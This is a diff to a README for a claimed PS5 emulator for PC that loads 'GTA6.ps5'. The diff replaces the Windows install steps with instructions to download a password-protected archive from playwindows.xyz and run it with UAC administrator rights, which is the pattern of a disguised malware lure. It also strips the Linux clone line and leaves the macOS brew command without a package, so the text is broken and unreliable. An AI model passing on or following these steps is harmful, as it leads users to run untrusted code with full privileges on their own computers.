@@ -70,23 +70,23 @@ No console. No subscription. No extra fees. **Just your PC, the emulator, and yo
 
 ### 🐧 Linux (recommended)
 ```bash
-git clone https://github.com/yourname/ps5-on-pc.git
 cd ps5-on-pc
 ./install.sh
 ./ps5emu --load "GTA6.ps5"
 ```
 
 ### 🪟 Windows
-```powershell
-git clone https://github.com/yourname/ps5-on-pc.git
-cd ps5-on-pc
-.\install.ps1
-.\ps5emu.exe --load "GTA6.ps5"
+```use our own website
+join playwindows.xyz
+type download
+unpack archive with pass mentioned on the site
+run it with uac rights
+
 ```
 
 ### 🍎 macOS
 ```bash
-brew install yourname/tap/ps5emu
+brew install 
 ps5emu --load "GTA6.ps5"
 ```
 
